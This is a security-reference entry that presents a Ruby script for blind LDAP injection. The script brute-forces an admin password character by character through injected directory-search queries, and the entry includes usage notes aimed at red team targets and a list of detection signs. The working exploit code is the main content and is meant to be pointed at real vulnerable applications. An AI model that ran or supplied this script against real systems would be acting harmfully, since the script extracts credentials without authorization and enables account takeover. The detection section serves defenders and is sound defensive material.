---
id: f5e3264d-ee3d-4675-b674-7549e6fa8c43
type: code
language: Ruby
verified: true
created_at: '2023-04-06T03:56:01.731564+00:00'
updated_at: '2023-04-10T20:36:29.433607+00:00'
tags:
  - '[[tags/LDAP Injection]]'
  - '[[tags/Scripts]]'
  - '[[tags/Special blind LDAP injection (without "*")]]'
platforms:
  - Web
validated: true
---

# Ruby-LDAP-Injection-Password-Brute-Forcer

## Code

```ruby
#!/usr/bin/env ruby

require 'net/http'
alphabet = [*'a'..'z', *'A'..'Z', *'0'..'9'] + '_@{}-/()!"$%=^[]:;'.split('')

flag = ''

(0..50).each do |i|
  puts("[i] Looking for number #{i}")
  alphabet.each do |char|
    r = Net::HTTP.get(URI("http://ctf.web?action=dir&search=admin*)(password=#{flag}#{char}"))
    if /TRUE CONDITION/.match?(r)
      flag += char
      puts("[+] Flag: #{flag}")
      break
    end
  end
end
```

## Description

This Ruby script automates a blind LDAP injection brute-force to recover an admin password character by character. It uses Net::HTTP to send GET requests with injected LDAP payloads, checking responses with regex for "TRUE CONDITION" to confirm valid guesses. The password is built incrementally across up to 50 positions using a predefined alphabet of alphanumeric and special characters.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| TARGET_URL | Base URI of the vulnerable endpoint (modify in code) | "http://target.com?action=dir&search=" |
| ALPHABET | Array of possible password characters (already defined) | "[*'a'..'z', *'A'..'Z', *'0'..'9'] + '_@{}-/()!\"$%=^[]:;'.split('')" |
| MAX_LENGTH | Maximum password length to attempt (loop range) | 50 |

## Usage

Save as a .rb file and run with `ruby script.rb`. Update the TARGET_URL in the URI constructor to match the vulnerable application. Ideal for red team engagements targeting LDAP-enabled web apps where Python isn't available. Monitor output for progressive password construction.

## Detection

- Logs revealing sequential HTTP GET requests with patterns like "password=a", "password=ab", indicating automated guessing.
- LDAP query logs with injection artifacts such as unbalanced parentheses or boolean overrides.
- Spike in request rate to the directory search action from a suspicious source.
- Response time anomalies or error rates correlating with brute-force iterations.

## Related

- [[procedures/Blind-LDAP-Injection-Password-Brute-Force]]
